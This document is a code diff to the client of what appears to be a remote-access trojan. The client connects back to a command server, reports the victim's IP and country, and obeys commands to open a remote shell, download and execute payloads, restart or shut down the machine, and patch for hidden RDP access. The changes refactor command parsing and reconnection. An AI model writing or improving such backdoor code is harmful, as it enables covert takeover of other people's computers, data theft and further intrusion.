@@ -7,6 +7,7 @@ import platform
 
 BUFFER_SIZE = 1024
 RECONNECT_TIMER = 3
+SERVER_ADDRESS = '127.0.0.1'
 
 
 class Client:
@@ -38,7 +39,7 @@ class Client:
 
     def receive(self, as_bytes=False):
         """
-        Recieve a message in small chunks from the Server
+        Receive a message in small chunks from the Server
         :param as_bytes: If set to True, this function will return the data as bytes. Default=False
         """
         chunk = self.client_socket.recv(BUFFER_SIZE)
@@ -50,11 +51,11 @@ class Client:
         return data if as_bytes else data.decode()
 
 
-def connect_to_server():
+def main():
     """ Connects to the server and send it info about the system """
     try:
         # Connect to server
-        client = Client('127.0.0.1', 8000)
+        client = Client(SERVER_ADDRESS, 8000)
 
         # Send client info to the server - IP, Country Code, Name, Os
         response = json.loads(requests.get('http://ip-api.com/json/?fields=status,countryCode,query').text)
@@ -63,17 +64,18 @@ def connect_to_server():
 
             # Respond to server requests
             while True:
-                cmd = client.receive()
-                if cmd == 'shell':
-                    Shell.shell(client)
-                elif cmd == 'restart':
+                cmd = client.receive().split(maxsplit=1)
+                print(cmd)
+                if cmd[0] == 'shell':
+                    Shell.shell(client, cmd[1])
+                elif cmd[0] == 'restart':
                     Power.restart()
-                elif cmd == 'shutdown':
+                elif cmd[0] == 'shutdown':
                     Power.shutdown()
-                elif cmd == 'execute':
+                elif cmd[0] == 'execute':
                     Execute.download_and_execute(client)
-                elif cmd == 'hrdp':
-                    HRDP.patch(client)
+                elif cmd[0] == 'hrdp':
+                    HRDP.patch(client, cmd[1])
                 else:
                     client.send('[!] Unconfigured option')
         else:
@@ -82,11 +84,7 @@ def connect_to_server():
     except socket.error:
         print('Connection lost... Trying to reconnect...')
         sleep(RECONNECT_TIMER)
-
-
-def main():
-    while True:
-        connect_to_server()
+        main()
 
 
 if __name__ == "__main__":
